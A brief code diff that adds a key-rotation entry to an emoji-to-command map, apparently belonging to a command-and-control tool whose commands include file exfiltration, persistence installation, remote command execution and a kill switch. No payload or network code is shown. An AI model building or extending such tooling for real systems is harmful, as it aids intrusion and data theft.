@@ -8,7 +8,8 @@ EMOJI_MAP = {
     '📂': 'cmd_exfil',      # Exfiltrate File
     '🔄': 'cmd_persist',    # Install Persistence
     '🛑': 'cmd_exit',       # Kill Switch
-    '⚡': 'cmd_exec'         # Remote Command Execution
+    '⚡': 'cmd_exec',        # Remote Command Execution
+    '🔑': 'cmd_keygen',     # Key Rotation (V1.0 Key Management)
 }
 
 def normalize_homoglyphs(text):
